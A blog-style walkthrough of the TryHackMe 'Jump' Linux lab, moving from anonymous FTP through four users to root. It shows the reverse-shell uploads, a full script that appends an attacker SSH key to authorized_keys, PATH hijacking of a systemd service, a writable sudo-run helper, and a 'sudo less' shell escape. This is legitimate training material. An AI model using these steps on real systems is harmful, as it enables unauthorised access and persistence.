---
title: "Write-Up: TryHackMe / Jump"
categories: [Labs]
tags: [tryhackme, ctf, linux]
description: |
    My walkthrough of the Jump room on TryHackMe.  Exploiting common
    misconfigurations to gain low-privileged access and escalate privileges to
    root.
---
## Overview

**Lab:** [TryHackMe / Jump](https://tryhackme.com/room/jump)

**Type:** Linux

**Tools / Resources:**

- [nmap](https://nmap.org/)
- [GTFOBins](https://gtfobins.org/)
- [revshells](https://www.revshells.com/)
- [netcat](https://en.wikipedia.org/wiki/Netcat)

### Description

> You’ve discovered a misconfigured internal automation pipeline running on a
> server. The system processes recon scripts, development backups, monitoring
> jobs, and deployment tasks across multiple users. Each stage of the pipeline
> relies too heavily on the previous one. By abusing these trust boundaries,
> you must move laterally through the system.
>
> Your objective is to escalate from anonymous access all the way through:
> 
> `recon_user → dev_user → monitor_user → ops_user → root`


### Questions

- What is the flag found in the recon_user’s home directory?
- What is the flag found in the dev_user’s home directory?
- What is the flag found in the monitor_user's home directory?
- What is the flag found in the ops_user's home directory?
- What is the flag found in the root user's home directory?

## Initial Access

As with any CTF - the first step is an nmap scan.

```diff
root@ip-10-66-84-93:~# nmap -p- -T4 -A -n 10.66.156.33
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-27 11:11 UTC
Nmap scan report for 10.66.156.33
Host is up (0.00033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 115      123          4096 Apr 30 06:00 incoming [NSE: writeable]
|_drwxr-xr-x    4 115      123          4096 Jun 09 08:22 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.66.84.93
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:a1:75:5f:94:c3:28:13:de:eb:f5:66:a6:90:1d:8b (ECDSA)
|_  256 0e:80:03:f4:f7:c4:bb:74:a7:d1:43:15:c5:c8:3e:49 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=6/27%OT=21%CT=1%CU=35930%PV=Y%DS=1%DC=T%G=Y%TM=6A3F
OS:B005%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)SEQ(SP
OS:=FF%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW
OS:7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F
OS:4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M
OS:2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G
OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT     ADDRESS
1   0.51 ms 10.66.156.33

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds
```

As hinted to by the description, nmap identified that ftp was accessible
anonymously.  This is very common with public file shares, but does provide a
foothold into the system.

## ftp &#8594; recon_user

Let's log in and see what's there  - it will prompt for a password, but you can
type anything:

```
root@ip-10-67-103-138:~# ftp 10.67.166.76
Connected to 10.67.166.76.
220 (vsFTPd 3.0.5)
Name (10.67.166.76:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls pub
229 Entering Extended Passive Mode (|||17202|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             139 Feb 02 07:19 README.txt
drwxr-xr-x    2 115      123          4096 Feb 01 11:12 archive
drwxrwxrwx    2 115      123          4096 Feb 01 11:12 uploads
226 Directory send OK.
ftp> ls incoming
229 Entering Extended Passive Mode (|||9880|)
150 Here comes the directory listing.
226 Directory send OK.
```

The incoming directory is empty, but pub has a README.txt - let's check it out:

```diff
ftp> get README.txt
local: README.txt remote: README.txt
229 Entering Extended Passive Mode (|||64811|)
150 Opening BINARY mode data connection for README.txt (139 bytes).
100% |***********************************************************************************************************|   139      239.82 KiB/s    00:00 ETA
226 Transfer complete.
139 bytes received in 00:00 (119.70 KiB/s)
ftp> !cat README.txt
[ recon pipeline ]

+All recon jobs must be placed in incoming/.
+Files are processed automatically on arrival.
+Invalid formats are ignored.
```

Just guessing that it's probably looking for a shell script to run.  I'll grab
one from [revshells](https://www.revshells.com/).  I used the `nc mkfifo` one
and saved it as `shell.sh`.

I started a netcat listener and then uploaded it.

```
ftp> cd incoming
250 Directory successfully changed.
ftp> pwd
Remote directory: /incoming
ftp> put shell.sh
local: shell.sh remote: shell.sh
229 Entering Extended Passive Mode (|||52219|)
150 Ok to send data.
100% |***********************************************************************************************************|    74      240.88 KiB/s    00:00 ETA
226 Transfer complete.
74 bytes sent in 00:00 (0.35 KiB/s)
```

And I got the connection:

```
Listening on 0.0.0.0 1337
Connection received on 10.66.156.33 58422
sh: 0: can't access tty; job control turned off
$ whoami 
recon_user
$ 
```

Afterward, I stabilized, added an ssh key for persistence, and then connected.

```
recon_user@tryhackme-2404:~$ cat flag.txt
THM{REDACTED}
recon_user@tryhackme-2404:~$
```

## recon_user &#8594; dev_user

Next level is `dev_user` - I decided just to check if the flag was accessible
and it was:

```
recon_user@tryhackme-2404:~$ cat /home/dev_user/flag.txt 
THM{REDACTED}
```

The reason is the file was group readable and I'm part of the group:
```

recon_user@tryhackme-2404:~$ id
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
```

That doesn't help me get further, though, so let's try to get a shell.  The 
common theme for most privilege escalation techniques in Linux is that you're
looking for a file or command that you control that can be executed by a
different user.  One of the ways this manifests is writable files.  We can use
the find command as the first step to identifying those - I also excluded some
directories that I don't want to look at to keep the results short:

```diff
recon_user@tryhackme-2404:~$ find / -writable -type f 2>/dev/null | egrep -vE ^/snap/ | egrep -vE ^/dev/ | egrep -vE ^/proc/ | egrep -vE ^/sys/
/run/user/1001/systemd/generator.late/app-xdg\x2duser\x2ddirs@autostart.service
/run/user/1001/systemd/generator.late/app-snap\x2duserd\x2dautostart@autostart.service
/run/user/1001/systemd/propagate/.os-release-stage/os-release
/tmp/recon_backup.tgz
+/opt/dev/backup.sh
/opt/dev/bin/ps
/opt/recon/scan_uploads.sh
/home/recon_user/shell.sh
/home/recon_user/flag.txt
/home/recon_user/.profile
/home/recon_user/.bashrc
/home/recon_user/.cache/motd.legal-displayed
/home/recon_user/.viminfo
/home/recon_user/put
/home/recon_user/.selected_editor
/home/recon_user/.ssh/authorized_keys
/home/recon_user/.ssh/id_ed25519.pub
/home/recon_user/.ssh/id_ed25519
/home/recon_user/.bash_logout
/home/dev_user/.selected_editor
```

There's a couple files there, but the one that stood out to me is `backup.sh`.

Let's take a look at what it does:

```diff
recon_user@tryhackme-2404:~$ cat /opt/dev/backup.sh 
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
recon_user@tryhackme-2404:~$ ls -l /tmp/recon_backup.tgz 
+-rw-rw-r-- 1 dev_user dev_user 45 Jun 27 11:36 /tmp/recon_backup.tgz
recon_user@tryhackme-2404:~$ date
+Sat Jun 27 11:36:53 UTC 2026
```

Okay so the script creates a tarball for the recon_user's folder in the `/tmp`
directory.  It looks like the file is owned by `dev_user` and it does seem to
have an up-to-date time so it must run out of their cron.

I tried overwriting it with the same reverse shell, but it didn't seem to work.
At some point, I'd like to go back and see if I can find out why, but for now I
just moved onto a different shell - the one labeled `bash -i` in revshells.

```
Listening on 0.0.0.0 1337


Connection received on 10.66.156.33 40012
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
dev_user@tryhackme-2404:~$ 
dev_user@tryhackme-2404:~$ 
dev_user@tryhackme-2404:~$ ls
ls
flag.txt
dev_user@tryhackme-2404:~$ cat flag.txt
cat flag.txt
THM{REDACTED}
```

There we go.  Once again, throw the ssh key in there to keep access and we can
move on.

## dev_user &#8594; monitor_user

Just like with the jump into `dev_user` let's look for files that are writable:

```
dev_user@tryhackme-2404:~$ find / -writable -type f 2>/dev/null | egrep -vE ^/snap/ | egrep -vE ^/dev/ | egrep -vE ^/proc/ | egrep -vE ^/sys/
/run/user/1002/systemd/generator.late/app-xdg\x2duser\x2ddirs@autostart.service
/run/user/1002/systemd/generator.late/app-snap\x2duserd\x2dautostart@autostart.service
/run/user/1002/systemd/propagate/.os-release-stage/os-release
/tmp/recon_backup.tgz
/opt/dev/backup.sh
/opt/dev/bin/ps
/home/dev_user/flag.txt
/home/dev_user/.profile
/home/dev_user/.bashrc
/home/dev_user/.cache/motd.legal-displayed
/home/dev_user/.selected_editor
/home/dev_user/.ssh/authorized_keys
/home/dev_user/.bash_logout
```

There's nothing really new - we haven't interacted with `/opt/dev/bin/ps`, but
we can leave that alone for now.  Let's look for files that are owned by the
target user:

```diff
dev_user@tryhackme-2404:~$ find / -user monitor_user 2>/dev/null | egrep -vE ^/snap/ | egrep -vE ^/dev/ | egrep -vE ^/proc/ | egrep -vE ^/sys/
/opt/app/data
/opt/app/deploy_helper.sh
+/usr/local/bin/healthcheck
/home/monitor_user
+/var/log/monitor.log
```

Taking a look at `monitor.log` I see a process listing via `ps` and the call to
`/usr/local/bin/healthcheck` is given a `PATH` that includes
`/home/dev_user/bin`.  That all, but confirms my suspicious - we're going to do
some PATH hijacking.

PATH hijacking is where you add an executable file into the PATH of another
user.  When the user executes the name of the command without specifying a full
path (e.g. calling `ps` rather than `/usr/bin/ps`), it runs your script
instead.

Let's check out the `healthcheck` command and see if that applies:

```diff
dev_user@tryhackme-2404:~$ cat /usr/local/bin/healthcheck 
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
+  ps aux | grep -v grep
  sleep 5
done
```

Definitely - cool let's create a script that skips the middle man and just adds
a ssh key directly:

```bash
#!/bin/bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKxmk4iE8CzO31T+H8vusuvLh2W6CQouUC5agHwZMgjT hacked" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh/authorized_keys
```

I saved it in `/home/dev_user/bin/` and waited 5 seconds, then:

```
monitor_user@10.67.145.5: Permission denied (publickey).
```

Hmm, okay let's see what's going on:

```
monitor+     605       1  0 18:09 ?        00:00:00 /bin/bash /usr/local/bin/healthcheck
```

The parent process id is 1 which is the init process.  It must not be running
out of cron or an interactive session.  Let's check for it in the services:

```diff
dev_user@tryhackme-2404:~$ grep -Ri healthcheck /etc/systemd/
+/etc/systemd/system/healthcheck.service:ExecStart=/usr/local/bin/healthcheck
grep: /etc/systemd/system/multi-user.target.wants/ec2-instance-connect.service: No such file or directory
grep: /etc/systemd/system/multi-user.target.wants/lxd-agent-9p.service: No such file or directory
grep: /etc/systemd/system/timers.target.wants/fwupd-refresh.timer: No such file or directory
/etc/systemd/system/timers.target.wants/healthcheck.timer:Description=Run healthcheck every minute
/etc/systemd/system/healthcheck.timer:Description=Run healthcheck every minute
```

There we go - let's check out `/etc/systemd/system/healthcheck.service` - 

```diff
dev_user@tryhackme-2404:~$ cat /etc/systemd/system/healthcheck.service
[Unit]
Description=System Health Check

[Service]
Type=simple
User=monitor_user
+Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

Okay that's why - we need to overwrite where we saw the file earlier.  I added
the same script to `/opt/dev/bin`, waited 5 seconds and...

```
monitor_user@tryhackme-2404:~$ cat flag.txt
THM{REDACTED}
```

## monitor_user &#8594; ops_user

We're almost there - let's do the same check for writable files:

```diff
monitor_user@tryhackme-2404:~$ find / -writable -type f 2>/dev/null | egrep -vE ^/snap/ | egrep -vE ^/dev/ | egrep -vE ^/proc/ | egrep -vE ^/sys/
/run/user/1003/systemd/generator.late/app-snap\x2duserd\x2dautostart@autostart.service
/run/user/1003/systemd/generator.late/app-xdg\x2duser\x2ddirs@autostart.service
/run/user/1003/systemd/propagate/.os-release-stage/os-release
+/opt/app/deploy_helper.sh
/usr/local/bin/healthcheck
/home/monitor_user/flag.txt
/home/monitor_user/.profile
/home/monitor_user/.bashrc
/home/monitor_user/.lesshst
/home/monitor_user/.cache/motd.legal-displayed
/home/monitor_user/.ssh/authorized_keys
/home/monitor_user/.bash_logout
/var/log/monitor.log
```

I see there's a `/opt/app/deploy_helper.sh`, but I don't see anything that stands out:

```
monitor_user@tryhackme-2404:~$ cat /opt/app/deploy_helper.sh 
#!/bin/bash
echo "[+] Deploy helper running"
echo "[+] Syncing application files"
sleep 2
```

I decide to check for sudo privileges.  Sudo is a tool that allows you to,
effectively, impersonate a user and run a command as them.  It's considered a
best practice when running a Linux system to never log in as root and only
run root commands via sudo.

```diff
monitor_user@tryhackme-2404:~$ sudo -l
Matching Defaults entries for monitor_user on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LESS

User monitor_user may run the following commands on tryhackme-2404:
+    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

Ah-hah!  So we can run the `deploy.sh` script as the ops_user.  Let's see what
it does:

```diff
#!/bin/bash
cd /opt/app 2>/dev/null
+./deploy_helper.sh
```

It does a whole lot of nothing, but it does run the deploy_helper file that we
can modify.

Let's add the same ssh key and run it:

```
monitor_user@tryhackme-2404:~$ sudo -u ops_user /usr/local/bin/deploy.sh 
[+] Deploy helper running
[+] Syncing application files
```

Trying the key and:

```
ops_user@tryhackme-2404:~$ cat flag.txt
THM{REDACTED}
```

## ops_user &#8594; root

Last step - since the previous jump was using sudo, let's just take a look at
that first:

```diff
ops_user@tryhackme-2404:~$ sudo -l
Matching Defaults entries for ops_user on tryhackme-2404:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=LESS

User ops_user may run the following commands on tryhackme-2404:
+    (root) NOPASSWD: /usr/bin/less
```

Well there you go!  Let's take a look at [GTFOBins](https://gtfobins.org/) and
see if there's anything for `less`.

There is [here](https://gtfobins.org/gtfobins/less/#shell) - if you open any
file and then use the `!` key to execute a command, it will run as the user
less is open as.  Let's give it a shot:

```
ops_user@tryhackme-2404:~$ sudo less /etc/hosts
root@tryhackme-2404:/home/ops_user# cat /root/flag.txt
THM{REDACTED}
```
